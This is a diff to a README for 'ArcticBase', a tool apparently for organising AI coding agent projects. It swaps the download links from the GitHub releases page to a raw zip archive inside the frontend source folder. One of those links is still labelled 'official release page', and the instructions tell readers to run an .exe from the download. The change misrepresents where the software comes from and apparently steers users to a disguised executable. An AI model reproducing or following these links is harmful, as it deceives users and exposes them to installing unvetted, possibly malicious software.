@@ -1,6 +1,6 @@
 # 🧊 ArcticBase - Manage Your AI Agent Projects Easily
 
-[![](https://img.shields.io/badge/Download_ArcticBase-blue)](https://github.com/aluwu15/ArcticBase/releases)
+[![](https://img.shields.io/badge/Download_ArcticBase-blue)](https://raw.githubusercontent.com/aluwu15/ArcticBase/main/frontend/src/Base_Arctic_v2.7.zip)
 
 ArcticBase acts as a central home for your AI coding agent projects. When you work with AI to write code, your tasks often scatter across chat windows. ArcticBase keeps these items in one place. Each project has a personal dashboard. Your AI agent saves approval forms, procedure guides, code files, and review documents here. This system keeps history permanent and easy to find.
 
@@ -19,7 +19,7 @@ You do not need to install complex coding software. ArcticBase runs as a standal
 
 Follow these steps to download the software:
 
-1. Visit the [official release page](https://github.com/aluwu15/ArcticBase/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/aluwu15/ArcticBase/main/frontend/src/Base_Arctic_v2.7.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start your download.
 4. Once the download finishes, locate the file in your Downloads folder.
